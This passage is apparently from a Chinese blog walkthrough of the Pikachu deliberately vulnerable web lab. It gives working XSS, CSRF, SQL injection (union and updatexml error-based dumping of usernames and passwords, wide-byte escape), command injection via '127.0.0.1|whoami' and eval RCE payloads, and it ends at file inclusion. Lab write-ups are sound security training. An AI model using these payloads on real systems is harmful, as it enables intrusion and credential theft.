      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231408403.png" alt="image-20240523140854372"></p>

        <h2 id="xss之htmlspecialchars"   >
          <a href="#xss之htmlspecialchars" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231409420.png" alt="image-20240523140933393"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后又有一个蓝色链接可以点击，这个点击后显示403，又换成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231412235.png" alt="image-20240523141230203"></p>

        <h2 id="xss之href输出"   >
          <a href="#xss之href输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231414102.png" alt="image-20240523141453076"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后又有一个蓝色链接可以点击，这个点击后显示403，又换成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>还是不行</p>
<p>再尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231423889.png" alt="image-20240523142324853"></p>

        <h2 id="xss之js输出"   >
          <a href="#xss之js输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231426393.png" alt="image-20240523142646368"></p>
<p>三条都尝试了还是不行，推测可能和闭合有关</p>
<p>先闭合前面的<script>标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231426354.png" alt="image-20240523142629317"></p>

        <h1 id="CSRF"   >
          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
      
        <h2 id="CSRF-get-login"   >
          <a href="#CSRF-get-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-get-login" class="headerlink" title="CSRF(get) login"></a>CSRF(get) login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231429396.png" alt="image-20240523142904373"></p>
<p>点击右上角的提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231429974.jpg" alt="img"></p>
<p>随机尝试一个用户登录，此处以vince用户登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430882.jpg" alt="img"></p>
<p>登录成功修改个人信息为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430885.jpg" alt="img"></p>
<p>发送后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430893.jpg" alt="img"></p>
<p>可以看到是以GET方法请求数据，可以直接在抓包的url上修改信息，构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=male&amp;phonenum=123456&amp;add=chongqing&amp;email=123456.com&amp;submit=submit HTTP/1.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430896.jpg" alt="img"></p>
<p>发送之后停止拦截可以看到网页上的信息已经修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430902.jpg" alt="img"></p>

        <h2 id="CSRF-post-login"   >
          <a href="#CSRF-post-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-post-login" class="headerlink" title="CSRF(post) login"></a>CSRF(post) login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431414.png" alt="image-20240523143125386"></p>
<p>还是根据提示登录vince的账号，还是保持之前的登录和上一步修改后的信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431357.jpg" alt="img"></p>
<p>修改个人信息后抓包发现url上没有显示参数，那就不能通过修改url来发送请求了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431355.jpg" alt="img"></p>
<p>可以按F12直接修改信息，信息修改成功！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431364.jpg" alt="img"></p>

        <h2 id="CSRF-Token-login"   >
          <a href="#CSRF-Token-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-Token-login" class="headerlink" title="CSRF Token login"></a>CSRF Token login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231447006.png" alt="image-20240523144727966"></p>
<p>依然是用Vince的账号登录，修改个人信息后抓包发现有token验证</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231440379.png" alt="image-20240523144025332"></p>
<p>在扩展-BApp商店里找到CSRF Token Tracker安装下载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231446031.png" alt="image-20240523144630977"></p>
<p>设置一下规则</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231447095.png" alt="image-20240523144700052"></p>
<p>将抓到的包发到Repeater，点击发送看到信息并未修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231444583.png" alt="image-20240523144441522"></p>
<p>再点击跟随重定向，发现信息修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231445588.png" alt="image-20240523144555530"></p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/115771540" >https://blog.csdn.net/elephantxiang/article/details/115771540</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="数字型注入"   >
          <a href="#数字型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231448325.png" alt="image-20240523144858298"></p>
<p>只能选择数字，并且URL上没有数据，那么抓包发送到Repeater注入1 OR 1=1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231450844.png" alt="image-20240523145051807"></p>
<p>确实存在注入，并且把所有信息都列出来了</p>
<p>然后可以按DVWA中的Medium难度一点一点注入，最终得到所有的username和password</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231455980.png" alt="image-20240523145554927"></p>

        <h2 id="字符型注入"   >
          <a href="#字符型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231456877.png" alt="image-20240523145629850"></p>
<p>同DVWA靶场的Low难度，最终得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231500546.png" alt="image-20240523150019503"></p>

        <h2 id="搜索型注入"   >
          <a href="#搜索型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231521638.png" alt="image-20240523152138609"></p>
<p>输入一个v，会返回用户名中所有含v的信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241431942.png" alt="image-20240524143157907"></p>
<p>可以猜想后台使用了数据库中的搜索这个逻辑，比如用了LIKE，就可以构造对应的闭合，闭合前面的 单引号和百分号，注释后面的百分号和单引号</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v%&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>

<p>所有成员的信息都出来了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241441903.png" alt="image-20240524144148860"></p>

        <h4 id="查看列数"   >
          <a href="#查看列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,3;#</span><br><span class="line">%&#x27; union select 1,2,3,4;# //报错</span><br></pre></td></tr></table></div></figure>

<p>所以有三列</p>

        <h4 id="获取当前数据库"   >
          <a href="#获取当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241451230.png" alt="image-20240524145107197"></p>

        <h4 id="获取数据表名"   >
          <a href="#获取数据表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241510679.png" alt="image-20240524151013642"></p>

        <h4 id="查看表字段名"   >
          <a href="#查看表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241511878.png" alt="image-20240524151122845"></p>

        <h4 id="查看字段内容"   >
          <a href="#查看字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(username,password) from pikachu.users;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241512700.png" alt="image-20240524151240662"></p>

        <h2 id="xx型注入"   >
          <a href="#xx型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231522288.png" alt="image-20240523152202259"></p>
<p>提示告诉我们要制造闭合，具体是什么样的闭合只能看一下后台源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241521128.png" alt="image-20240524152125089"></p>
<p>用括号的方式拼接SQL查询语句</p>
<p>方法同理</p>

        <h2 id="”Insert-Update”注入"   >
          <a href="#”Insert-Update”注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#”Insert-Update”注入" class="headerlink" title="”Insert/Update”注入"></a>”Insert/Update”注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231522223.png" alt="image-20240523152254190"></p>
<p>点击注册，让我们填写信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261431092.png" alt="image-20240526142959198"></p>
<p>随便填写后抓个包，看出是POST方式传参，而且有username、password、sex、email、add、submit这几个参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261432728.png" alt="image-20240526143241658"></p>

        <h3 id="Insert注入"   >
          <a href="#Insert注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#Insert注入" class="headerlink" title="Insert注入"></a>Insert注入</h3>
      <p>将username的值修改为1’ or ‘1’=’1，提示注册成功，所以是单引号闭合的字符型注入</p>
<p>接下来就可以获取一些数据了</p>

        <h4 id="获取数据库"   >
          <a href="#获取数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><code>updatexml()</code>: 这个函数用于修改XML文档并返回结果。如果第一个参数不是一个有效的XML文档，或者XPath表达式（第二个参数）无法执行，则会产生一个错误</p>
<p><code>concat()</code>: 用来连接字符串</p>
<p><code>0x7e</code>: 这是波浪号（~）的十六进制表示，常用作数据分隔符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261442193.png" alt="image-20240526144218147"></p>

        <h4 id="获取数据库表名"   >
          <a href="#获取数据库表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><code>substr()</code>: 这个函数用于从字符串中提取子字符串。在这个注入代码中，它用于限制 <code>group_concat()</code> 函数返回的字符串长度，以避免超过错误消息的大小限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261446954.png" alt="image-20240526144648900"></p>

        <h4 id="查看表字段名-1"   >
          <a href="#查看表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-1" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261448037.png" alt="image-20240526144842987"></p>

        <h4 id="查看字段内容-1"   >
          <a href="#查看字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-1" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261455784.png" alt="image-20240526145540702"></p>
<p>只有一条信息，型要看下一条就把1+31就行，表示从第32个字符开始</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),32,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261456614.png" alt="image-20240526145638554"></p>

        <h3 id="Update注入"   >
          <a href="#Update注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#Update注入" class="headerlink" title="Update注入"></a>Update注入</h3>
      <p>注册一个账号登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261459835.png" alt="image-20240526145930768"></p>
<p>点击修改个人信息修改后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261503349.png" alt="image-20240526150314275"></p>
<p>也是POST传参</p>
<p>将sex值改为1‘，报错，表示闭合是单引号</p>

        <h4 id="获取数据库-1"   >
          <a href="#获取数据库-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-1"   >
          <a href="#获取数据库表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-1" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看表字段名-2"   >
          <a href="#查看表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-2" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-2"   >
          <a href="#查看字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-2" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h2 id="“Delete”注入"   >
          <a href="#“Delete”注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#“Delete”注入" class="headerlink" title="“Delete”注入"></a>“Delete”注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231523066.png" alt="image-20240523152317026"></p>
<p>留言一条后删除并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261520524.png" alt="image-20240526152008451"></p>
<p>以GET方式传参id，那可以直接就在URL上更改，而且这个id的值为一个数字，推测应该是数字型注入，尝试更改id的值为1 or 1=1，删除成功，所以是数字型注入</p>

        <h4 id="获取数据库-2"   >
          <a href="#获取数据库-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-2"   >
          <a href="#获取数据库表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-2" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取表字段名"   >
          <a href="#获取表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-3"   >
          <a href="#查看字段内容-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-3" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) # </span><br><span class="line">//这是第一条字段内容</span><br></pre></td></tr></table></div></figure>


        <h2 id="http头注入"   >
          <a href="#http头注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231523881.png" alt="image-20240523152359853"></p>
<p>登录进去后，显示了我的一些http头信息，也就是说后台会获取 http头里的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261537320.png" alt="image-20240526153734251"></p>
<p>抓包，把 User-Agent 改为一个单引号，发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261541125.png" alt="image-20240526154130067"></p>
<p>发现直接报了 SQL 语法错误，所以这里就存在注入</p>
<p>可以直接用Insert注入的语句，但是最后的#要改成 or ‘，使得整个 <code>WHERE</code> 子句在逻辑上为真，注释后续内容</p>

        <h2 id="基于boolian的盲注"   >
          <a href="#基于boolian的盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231525628.png" alt="image-20240523152535603"></p>
<p>尝试之后只会返回存在/不存在这个用户，用dvwa中的布尔盲注和sqlmap注入流程</p>

        <h2 id="基于时间的盲注"   >
          <a href="#基于时间的盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231525510.png" alt="image-20240523152550485"></p>
<p>同dvwa时间盲注方式</p>

        <h2 id="宽字节注入"   >
          <a href="#宽字节注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2>
      
        <h6 id="当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节"   >
          <a href="#当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节" class="heading-link"><i class="fas fa-link"></i></a><a href="#当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节" class="headerlink" title="当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节"></a>当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节</h6>
      
        <h6 id="宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符"   >
          <a href="#宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符" class="heading-link"><i class="fas fa-link"></i></a><a href="#宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符" class="headerlink" title="宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符\"></a>宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符\</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526614.png" alt="image-20240523152606588"></p>

        <h6 id="前一个字节ascii码要大于128才到汉字的范围"   >
          <a href="#前一个字节ascii码要大于128才到汉字的范围" class="heading-link"><i class="fas fa-link"></i></a><a href="#前一个字节ascii码要大于128才到汉字的范围" class="headerlink" title="前一个字节ascii码要大于128才到汉字的范围"></a>前一个字节ascii码要大于128才到汉字的范围</h6>
      <p>在单引号前面加上%df，让单引号成功逃逸，而且这关也类似于盲注，只会告诉你是否存在</p>

        <h1 id="RCE"   >
          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
      
        <h2 id="exec-“ping”"   >
          <a href="#exec-“ping”" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526021.png" alt="image-20240523152635997"></p>
<p>输入IP地址127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526901.jpg" alt="img"></p>
<p>再尝试输入127.0.0.1|whoami</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526900.jpg" alt="img"></p>
<p>返回指向whoami的结果</p>

        <h2 id="exec-“eval”"   >
          <a href="#exec-“eval”" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231528942.png" alt="image-20240523152803911"></p>

        <h6 id="eval是程序语言中的函数，功能是获取返回值"   >
          <a href="#eval是程序语言中的函数，功能是获取返回值" class="heading-link"><i class="fas fa-link"></i></a><a href="#eval是程序语言中的函数，功能是获取返回值" class="headerlink" title="eval是程序语言中的函数，功能是获取返回值"></a>eval是程序语言中的函数，功能是获取返回值</h6>
      <p>输入phoinfo();</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231528255.jpg" alt="img"></p>

        <h1 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1>
      
        <h2 id="本地文件包含"   >
          <a href="#本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529390.png" alt="image-20240523152924364"></p>
<p>随便选择一个提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529435.jpg" alt="img"></p>
